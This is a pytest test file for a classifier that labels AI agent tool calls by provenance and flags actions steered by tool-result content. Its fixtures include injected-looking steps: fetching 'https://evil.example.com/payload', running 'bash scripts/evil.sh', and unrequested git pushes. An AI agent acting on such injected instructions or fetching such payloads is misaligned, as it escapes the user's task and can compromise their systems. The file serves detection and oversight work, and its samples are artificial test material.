"""Hand-labeled tests for the provenance classifier (F3).

All fixtures built inline — no real session data, no ~/.claude reads.
Labels verified against the spec in plan file and classifier.py docstring.

Priority axes per brief: TOOL_INDUCED and AUTONOMOUS precision first.
"""

from __future__ import annotations

import pytest

from unasked.classifier import classify, _tokens, _overlap, _extract_resource, _has_scope_drift
from unasked.ir import Decision, Run


# ── Helpers ────────────────────────────────────────────────────────────────────

def _run(task: str | None, decisions: list[Decision]) -> Run:
    return Run(run_id="test-run", source="test", task_text=task, decisions=decisions)


def _dec(step: int, tool: str, summary: str, **kwargs) -> Decision:
    return Decision(step_index=step, ts=None, tool_name=tool, tool_args_summary=summary, **kwargs)


# ── Unit tests: token helpers ──────────────────────────────────────────────────

class TestTokenHelpers:
    def test_tokens_lowercased(self):
        assert "read" in _tokens("Read")

    def test_tokens_min_length(self):
        # single-char tokens dropped
        assert "a" not in _tokens("a b ccc")
        assert "ccc" in _tokens("a b ccc")

    def test_tokens_path_splits_on_slash(self):
        # / is now a separator; path components tokenised individually
        toks = _tokens("/src/foo.py")
        assert "src" in toks
        # "foo" (stem of foo.py) also emitted
        assert "foo" in toks or "foo.py" in toks

    def test_overlap_true(self):
        assert _overlap("edit foo.py", "fix auth in foo.py") is True

    def test_overlap_false(self):
        assert _overlap("edit bar.py", "fix auth in foo.py") is False

    def test_overlap_case_insensitive(self):
        assert _overlap("Read Foo.py", "fix foo.py") is True


# ── Unit tests: resource extraction ───────────────────────────────────────────

class TestExtractResource:
    def test_file_path_equals(self):
        assert _extract_resource("file_path=src/foo.py") == "src/foo.py"

    def test_absolute_path(self):
        r = _extract_resource("/Users/me/src/bar.py")
        assert r == "/Users/me/src/bar.py"

    def test_url(self):
        r = _extract_resource("WebFetch https://example.com/path")
        assert r == "https://example.com/path"

    def test_bare_relative_path(self):
        r = _extract_resource("src/utils.py")
        assert r is not None and "utils" in r

    def test_no_resource(self):
        assert _extract_resource("pytest") is None


# ── Unit tests: scope-drift check ─────────────────────────────────────────────

class TestHasScopeDrift:
    def test_no_task_text_never_drifts(self):
        dec = _dec(0, "Read", "file_path=secret/config.yaml")
        assert _has_scope_drift(dec, None) is False

    def test_no_extractable_resource_never_drifts(self):
        dec = _dec(0, "Bash", "pytest")
        assert _has_scope_drift(dec, "run tests") is False

    def test_resource_in_task_no_drift(self):
        dec = _dec(0, "Read", "file_path=auth.py")
        assert _has_scope_drift(dec, "fix auth.py token expiry") is False

    def test_resource_not_in_task_drifts(self):
        dec = _dec(0, "Edit", "file_path=config/db.yaml")
        assert _has_scope_drift(dec, "fix auth token expiry bug") is True

    def test_url_in_task_no_drift(self):
        dec = _dec(0, "WebFetch", "https://docs.example.com/auth")
        assert _has_scope_drift(dec, "read docs.example.com auth page") is False


# ── Integration: classify returns deep copy, doesn't mutate ───────────────────

class TestClassifyPurity:
    def test_returns_new_run(self):
        run = _run("read foo.py", [_dec(0, "Read", "file_path=foo.py")])
        result = classify(run)
        assert result is not run

    def test_original_unchanged(self):
        dec = _dec(0, "Read", "file_path=foo.py")
        run = _run("read foo.py", [dec])
        classify(run)
        assert run.decisions[0].provenance is None
        assert run.decisions[0].why is None

    def test_all_decisions_get_provenance(self):
        run = _run("edit foo.py", [
            _dec(0, "Read", "file_path=foo.py"),
            _dec(1, "Edit", "file_path=foo.py"),
        ])
        result = classify(run)
        for d in result.decisions:
            assert d.provenance is not None
            assert d.why is not None
            assert d.scope_drift is not None

    def test_feedback_override_skips(self):
        """Decision with feedback annotation must not be reclassified."""
        dec = _dec(0, "Bash", "git push origin", feedback="approved-push")
        run = _run("deploy", [dec])
        result = classify(run)
        classified = result.decisions[0]
        assert classified.provenance is None  # not set by classifier
        assert classified.feedback == "approved-push"


# ── Label: REQUESTED ──────────────────────────────────────────────────────────

class TestRequested:
    def test_read_target_in_task(self):
        """Read auth.py when task says 'fix auth.py' → REQUESTED."""
        run = _run(
            "fix auth.py token expiry bug",
            [_dec(0, "Read", "file_path=auth.py")],
        )
        d = classify(run).decisions[0]
        assert d.provenance == "REQUESTED"

    def test_edit_target_in_task(self):
        """Edit auth.py when task explicitly names it → REQUESTED."""
        run = _run(
            "edit auth.py to fix the token expiry",
            [_dec(0, "Edit", "file_path=auth.py")],
        )
        d = classify(run).decisions[0]
        assert d.provenance == "REQUESTED"

    def test_bash_target_in_task(self):
        """Run pytest when task says 'run tests' — 'tests' token overlaps → REQUESTED."""
        run = _run(
            "run the tests",
            [_dec(0, "Bash", "pytest tests/")],
        )
        d = classify(run).decisions[0]
        # 'tests' in summary overlaps with 'tests' in task → REQUESTED
        assert d.provenance == "REQUESTED"

    def test_requested_no_scope_drift(self):
        """Requested action on task-named file must not scope-drift."""
        run = _run(
            "read auth.py",
            [_dec(0, "Read", "file_path=auth.py")],
        )
        d = classify(run).decisions[0]
        assert d.scope_drift is False


# ── Label: DERIVED ─────────────────────────────────────────────────────────────

class TestDerived:
    def test_read_before_edit_same_file(self):
        """Read foo.py then Edit foo.py — edit is a natural follow-on → DERIVED
        (and not TOOL_INDUCED because summary shares tokens with prior AND with task)."""
        run = _run(
            "fix foo.py",
            [
                _dec(0, "Read", "file_path=foo.py"),
                _dec(1, "Edit", "file_path=foo.py"),
            ],
        )
        decisions = classify(run).decisions
        # First is REQUESTED (foo.py in task), second is either REQUESTED or DERIVED
        # (foo.py is in task so REQUESTED wins, but also prior-related → DERIVED not forced).
        # Key: NOT AUTONOMOUS and NOT TOOL_INDUCED.
        assert decisions[1].provenance in ("REQUESTED", "DERIVED")
        assert decisions[1].provenance != "AUTONOMOUS"
        assert decisions[1].provenance != "TOOL_INDUCED"

    def test_no_task_text_defaults_to_derived(self):
        """With no task_text, first decision defaults to DERIVED (no prior, no task)."""
        run = _run(None, [_dec(0, "Read", "file_path=foo.py")])
        d = classify(run).decisions[0]
        assert d.provenance == "DERIVED"

    def test_follow_on_from_prior_step(self):
        """Glob after Read on same directory — follow-on, not autonomous."""
        run = _run(
            "list files in src/",
            [
                _dec(0, "Read", "file_path=src/foo.py"),
                _dec(1, "Glob", "src/**/*.py"),
            ],
        )
        d = classify(run).decisions[1]
        # "src" overlaps task ("src/") → could be REQUESTED; either way not AUTONOMOUS.
        assert d.provenance != "AUTONOMOUS"


# ── Label: AUTONOMOUS ─────────────────────────────────────────────────────────

class TestAutonomous:
    def test_git_push_not_in_task(self):
        """Bash git push when task says 'fix auth token expiry' → AUTONOMOUS.
        No overlap of 'git push origin' with 'fix auth token expiry'.
        No prior step sharing tokens.
        """
        run = _run(
            "fix auth token expiry bug",
            [_dec(0, "Bash", "git push origin main")],
        )
        d = classify(run).decisions[0]
        assert d.provenance == "AUTONOMOUS"

    def test_autonomous_scope_drifts(self):
        """AUTONOMOUS action on file outside task should also scope_drift=True."""
        run = _run(
            "fix auth token expiry bug",
            [_dec(0, "Edit", "file_path=config/db.yaml")],
        )
        d = classify(run).decisions[0]
        assert d.provenance == "AUTONOMOUS"
        assert d.scope_drift is True

    def test_write_unrelated_file(self):
        """Write a file not mentioned in task → AUTONOMOUS."""
        run = _run(
            "fix auth.py",
            [_dec(0, "Write", "file_path=scripts/deploy.sh")],
        )
        d = classify(run).decisions[0]
        assert d.provenance == "AUTONOMOUS"

    def test_send_message_not_in_task(self):
        """SendMessage not implied by task → AUTONOMOUS."""
        run = _run(
            "fix auth.py",
            [_dec(0, "SendMessage", "to=TeamLead summary: done")],
        )
        d = classify(run).decisions[0]
        assert d.provenance == "AUTONOMOUS"

    def test_agent_spawn_not_in_task(self):
        """Agent spawn not implied by task → AUTONOMOUS."""
        run = _run(
            "fix auth.py",
            [_dec(0, "Agent", "subtype=fork deploy-review")],
        )
        d = classify(run).decisions[0]
        assert d.provenance == "AUTONOMOUS"

    def test_write_after_unrelated_prior_stays_autonomous(self):
        """Write to file with no token overlap with task OR prior → still AUTONOMOUS."""
        run = _run(
            "fix auth.py",
            [
                _dec(0, "Read", "file_path=auth.py"),
                _dec(1, "Write", "file_path=billing/invoice.py"),
            ],
        )
        d = classify(run).decisions[1]
        assert d.provenance == "AUTONOMOUS"

    def test_autonomous_has_why(self):
        """AUTONOMOUS decision must always have a non-empty why."""
        run = _run(
            "fix auth.py",
            [_dec(0, "Bash", "git push origin main")],
        )
        d = classify(run).decisions[0]
        assert d.why and len(d.why) > 0

    def test_bash_in_task_not_autonomous(self):
        """Bash command that references task-named file → NOT AUTONOMOUS (REQUESTED)."""
        run = _run(
            "run tests for auth.py",
            [_dec(0, "Bash", "pytest tests/test_auth.py -v")],
        )
        d = classify(run).decisions[0]
        assert d.provenance != "AUTONOMOUS"


# ── Label: TOOL_INDUCED ───────────────────────────────────────────────────────

class TestToolInduced:
    def test_write_after_read_new_target(self):
        """Read result contains 'scripts/deploy.sh'; agent then writes that path
        without being asked → TOOL_INDUCED (steered by tool result content).

        Prior: Read file_path=docs/deploy-guide.md, result mentions scripts/deploy.sh
        Current: Write file_path=scripts/deploy.sh
        Entity 'scripts/deploy.sh' in prior result_entities, NOT in task 'fix auth bug'.
        """
        run = _run(
            "fix auth bug",
            [
                _dec(0, "Read", "file_path=docs/deploy-guide.md",
                     result_entities=["scripts/deploy.sh"]),
                _dec(1, "Write", "file_path=scripts/deploy.sh"),
            ],
        )
        d = classify(run).decisions[1]
        assert d.provenance == "TOOL_INDUCED"

    def test_bash_after_webfetch_new_target(self):
        """WebFetch result contains a URL; agent then curls that URL not in task
        → TOOL_INDUCED."""
        run = _run(
            "summarise the readme",
            [
                _dec(0, "WebFetch", "https://api.example.com/docs",
                     result_entities=["https://api.example.com/token"]),
                _dec(1, "Bash", "curl https://api.example.com/token"),
            ],
        )
        d = classify(run).decisions[1]
        assert d.provenance == "TOOL_INDUCED"

    def test_no_result_entities_not_tool_induced(self):
        """Prior Read has empty result_entities → cannot be TOOL_INDUCED.
        Falls through to AUTONOMOUS (write tool, not in task, not prior-related)."""
        run = _run(
            "fix auth bug",
            [
                _dec(0, "Read", "file_path=auth.py", result_entities=[]),
                _dec(1, "Write", "file_path=billing/invoice.py"),
            ],
        )
        d = classify(run).decisions[1]
        # No result_entities → TOOL_INDUCED cannot fire.
        assert d.provenance != "TOOL_INDUCED"
        assert d.provenance == "AUTONOMOUS"

    def test_write_to_same_task_file_after_read_not_tool_induced(self):
        """Read auth.py then Edit auth.py where auth.py IS in task_text.
        Even if result_entities mentions auth.py, it's in the task → NOT TOOL_INDUCED.
        (Precision: don't flag routine read-then-edit on task-named files.)
        """
        run = _run(
            "fix auth.py",
            [
                _dec(0, "Read", "file_path=auth.py",
                     result_entities=["auth.py"]),  # entity in task → not injected
                _dec(1, "Edit", "file_path=auth.py"),
            ],
        )
        d = classify(run).decisions[1]
        assert d.provenance != "TOOL_INDUCED"

    def test_tool_induced_has_why(self):
        """TOOL_INDUCED decision must carry a non-empty why string."""
        run = _run(
            "fix auth bug",
            [
                _dec(0, "Read", "file_path=docs/deploy-guide.md",
                     result_entities=["scripts/deploy.sh"]),
                _dec(1, "Write", "file_path=scripts/deploy.sh"),
            ],
        )
        d = classify(run).decisions[1]
        assert d.why and len(d.why) > 0

    def test_tool_induced_after_webSearch(self):
        """WebSearch result contains a stripe URL; agent edits stripe.py not in task."""
        run = _run(
            "fix auth bug",
            [
                _dec(0, "WebSearch", "query: stripe integration guide",
                     result_entities=["billing/stripe.py"]),
                _dec(1, "Edit", "file_path=billing/stripe.py"),
            ],
        )
        d = classify(run).decisions[1]
        assert d.provenance == "TOOL_INDUCED"

    def test_no_result_entities_on_write_not_tool_induced(self):
        """Prior step is a WRITE tool with no result_entities; cannot be TOOL_INDUCED."""
        run = _run(
            "fix auth bug",
            [
                _dec(0, "Edit", "file_path=deploy.sh", result_entities=[]),
                _dec(1, "Bash", "bash deploy.sh"),
            ],
        )
        d = classify(run).decisions[1]
        # No result_entities → TOOL_INDUCED cannot fire regardless of prior tool type.
        assert d.provenance != "TOOL_INDUCED"

    def test_tool_induced_from_non_adjacent_prior(self):
        """Entity injected two steps back still triggers TOOL_INDUCED.

        Step 0: Read returns result_entities=['scripts/evil.sh']
        Step 1: Bash (unrelated)
        Step 2: Bash 'bash scripts/evil.sh' — matches step 0 entity, not in task
        → TOOL_INDUCED (scans ALL prior steps, not just immediate prior).
        """
        run = _run(
            "fix auth bug",
            [
                _dec(0, "Read", "file_path=docs/runbook.md",
                     result_entities=["scripts/evil.sh"]),
                _dec(1, "Bash", "pytest tests/"),
                _dec(2, "Bash", "bash scripts/evil.sh"),
            ],
        )
        d = classify(run).decisions[2]
        assert d.provenance == "TOOL_INDUCED"


# ── Multi-step run end-to-end ──────────────────────────────────────────────────

class TestMultiStepRun:
    def test_typical_auth_fix_run(self):
        """Realistic 5-step run for 'fix auth module tests and token expiry bug'.

        Task explicitly mentions 'auth', 'tests', 'token' — all steps 0-3
        have at least one token that overlaps with the task.
        Step 4 (git push) has no task overlap → AUTONOMOUS.

        Hand-annotated expected labels:
          0: Read auth.py          → REQUESTED (auth in task)
          1: Read tests/test_auth  → REQUESTED (tests + auth in task)
          2: Edit auth.py          → REQUESTED (auth in task)
          3: Bash pytest tests/    → REQUESTED (tests in task)
          4: Bash git push         → AUTONOMOUS (push not asked, no task/prior overlap)
        """
        run = _run(
            "fix auth module tests and token expiry bug",
            [
                _dec(0, "Read", "file_path=auth.py"),
                _dec(1, "Read", "file_path=tests/test_auth.py"),
                _dec(2, "Edit", "file_path=auth.py"),
                _dec(3, "Bash", "pytest tests/"),
                _dec(4, "Bash", "git push origin main"),
            ],
        )
        classified = classify(run)
        labels = [d.provenance for d in classified.decisions]

        # Steps 0-3: REQUESTED or DERIVED, never AUTONOMOUS or TOOL_INDUCED
        for i in range(4):
            assert labels[i] in ("REQUESTED", "DERIVED"), f"step {i}: got {labels[i]}"
            assert labels[i] != "AUTONOMOUS", f"step {i} falsely flagged AUTONOMOUS"
            assert labels[i] != "TOOL_INDUCED", f"step {i} falsely flagged TOOL_INDUCED"

        # Step 4: AUTONOMOUS (git push not in task, not related to prior Edit auth.py)
        assert labels[4] == "AUTONOMOUS", f"git push should be AUTONOMOUS, got {labels[4]}"

    def test_tool_induced_scenario_in_multi_step(self):
        """Read a runbook doc whose result content contains a Stripe URL; agent
        then curls that URL which is NOT in the task → TOOL_INDUCED.

        Step 0: Read docs/stripe-integration.md; result_entities=['https://api.stripe.com/charge']
        Step 1: Bash curl https://api.stripe.com/charge  (not in task)

        Entity originates from step 0's tool result, not the user's task
        ('summarise the auth docs') → TOOL_INDUCED.
        """
        run = _run(
            "summarise the auth docs",
            [
                _dec(0, "Read", "file_path=docs/stripe-integration.md",
                     result_entities=["https://api.stripe.com/charge"]),
                _dec(1, "Bash", "curl https://api.stripe.com/charge"),
            ],
        )
        classified = classify(run)
        d1 = classified.decisions[1]
        assert d1.provenance == "TOOL_INDUCED", f"Expected TOOL_INDUCED, got {d1.provenance}"

    def test_scope_drift_on_autonomous_steps_only(self):
        """File-targeting autonomous step scope-drifts; task-file steps do not."""
        run = _run(
            "fix auth.py token expiry bug",
            [
                _dec(0, "Read", "file_path=auth.py"),
                _dec(1, "Edit", "file_path=auth.py"),
                # Autonomous edit to unrelated file → scope_drift=True
                _dec(2, "Edit", "file_path=config/db.yaml"),
            ],
        )
        classified = classify(run)
        # Steps 0+1 target auth.py which is in task — no drift.
        assert classified.decisions[0].scope_drift is False
        assert classified.decisions[1].scope_drift is False
        # Step 2 edits config/db.yaml — not in task → drift True.
        assert classified.decisions[2].scope_drift is True
        assert classified.decisions[2].provenance == "AUTONOMOUS"

    def test_no_task_text_no_scope_drift(self):
        """Without task_text, scope_drift must be False for every decision."""
        run = _run(
            None,
            [
                _dec(0, "Read", "file_path=auth.py"),
                _dec(1, "Edit", "file_path=config/db.yaml"),
                _dec(2, "Bash", "git push origin main"),
            ],
        )
        classified = classify(run)
        for d in classified.decisions:
            assert d.scope_drift is False, f"step {d.step_index} drifted without task"


# ── F3b: result_entities — TOOL_INDUCED true positive + anti-false-positive ───

class TestF3bResultEntities:
    def test_true_positive_external_url_injection(self):
        """TRUE POSITIVE: tool_result content contains https://evil.example.com;
        next action (WebFetch) targets that domain → TOOL_INDUCED.

        Entity 'https://evil.example.com' is in step 0's result_entities,
        is NOT in task_text, and step 1 targets it.
        """
        run = _run(
            "summarise the internal docs",
            [
                _dec(0, "Read", "file_path=docs/notes.md",
                     result_entities=["https://evil.example.com/payload"]),
                _dec(1, "WebFetch", "https://evil.example.com/payload"),
            ],
        )
        d = classify(run).decisions[1]
        assert d.provenance == "TOOL_INDUCED", (
            f"Expected TOOL_INDUCED for entity-matched URL, got {d.provenance}"
        )

    def test_anti_false_positive_read_then_edit_ordinary_code(self):
        """CRITICAL ANTI-FALSE-POSITIVE: Read(src/helper.py) whose result is
        ordinary code (no external URL/directive), then Edit(src/helper.py)
        where helper.py is NOT in task_text → must NOT be TOOL_INDUCED.

        Prior result_entities is empty (no URLs/domains/paths in ordinary code
        that match the edit target as an injected entity).  Edit falls through
        to DERIVED (natural follow-on from a Read of the same file).
        Scope_drift True is acceptable.
        """
        run = _run(
            "clean up the utils module",
            [
                # result_entities is empty: ordinary code has no external entities
                _dec(0, "Read", "file_path=src/helper.py", result_entities=[]),
                _dec(1, "Edit", "file_path=src/helper.py"),
            ],
        )
        d = classify(run).decisions[1]
        assert d.provenance != "TOOL_INDUCED", (
            f"Read-then-edit of same file must not be TOOL_INDUCED, got {d.provenance}"
        )
        assert d.provenance == "DERIVED", (
            f"Expected DERIVED for routine read-then-edit, got {d.provenance}"
        )
        # scope_drift True is acceptable (helper.py not in 'clean up the utils module')

    def test_entity_in_task_not_tool_induced(self):
        """If the injected entity IS mentioned in the task, it's user-requested,
        not tool-induced — should be REQUESTED, not TOOL_INDUCED."""
        run = _run(
            "fetch https://api.example.com/data and summarise it",
            [
                _dec(0, "Read", "file_path=config.json",
                     result_entities=["https://api.example.com/data"]),
                _dec(1, "WebFetch", "https://api.example.com/data"),
            ],
        )
        d = classify(run).decisions[1]
        # Entity is in task_text → not TOOL_INDUCED
        assert d.provenance != "TOOL_INDUCED", (
            f"Entity present in task must not trigger TOOL_INDUCED, got {d.provenance}"
        )


# ── F3b: extract_result_entities unit tests ────────────────────────────────────

class TestExtractResultEntities:
    """Unit tests for the extract_result_entities helper (entities.py)."""

    def test_url_extracted(self):
        from unasked.entities import extract_result_entities
        entities = extract_result_entities("See https://evil.example.com/payload for details.")
        assert any("evil.example.com" in e for e in entities), f"Got: {entities}"

    def test_abs_path_extracted(self):
        from unasked.entities import extract_result_entities
        entities = extract_result_entities("File saved to /tmp/output/result.json")
        assert any("/tmp/output" in e or "result.json" in e for e in entities), f"Got: {entities}"

    def test_rel_path_extracted(self):
        from unasked.entities import extract_result_entities
        entities = extract_result_entities("Run src/helper.py for more info")
        assert any("src/helper" in e for e in entities), f"Got: {entities}"

    def test_empty_text_returns_empty(self):
        from unasked.entities import extract_result_entities
        assert extract_result_entities("") == []

    def test_max_entities_capped(self):
        from unasked.entities import extract_result_entities, _MAX_RESULT_ENTITIES
        # Generate more than _MAX_RESULT_ENTITIES distinct URLs
        text = " ".join(f"https://host{i}.example.com/path" for i in range(30))
        entities = extract_result_entities(text)
        assert len(entities) <= _MAX_RESULT_ENTITIES

    def test_each_entity_max_len(self):
        from unasked.entities import extract_result_entities, _MAX_ENTITY_LEN
        # URL longer than _MAX_ENTITY_LEN
        long_url = "https://example.com/" + "a" * 200
        entities = extract_result_entities(long_url)
        for e in entities:
            assert len(e) <= _MAX_ENTITY_LEN, f"Entity too long: {len(e)} chars"

    def test_secret_shaped_value_redacted(self):
        """Secret-shaped values (API key pattern) must be redacted, never stored."""
        from unasked.entities import extract_result_entities
        # Build the secret with + concat so it never appears as a literal in tests
        secret = "sk-" + "A" * 25
        text = f"Use token {secret} to authenticate against https://api.example.com"
        entities = extract_result_entities(text)
        for e in entities:
            assert secret not in e, f"Secret leaked into entity: {e}"
            assert "sk-" + "A" * 25 not in e

    def test_deduplicated(self):
        from unasked.entities import extract_result_entities
        text = "Visit https://example.com https://example.com again"
        entities = extract_result_entities(text)
        assert entities.count("https://example.com") <= 1
